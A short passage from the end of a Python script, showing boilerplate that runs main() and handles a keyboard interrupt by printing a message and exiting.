        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)
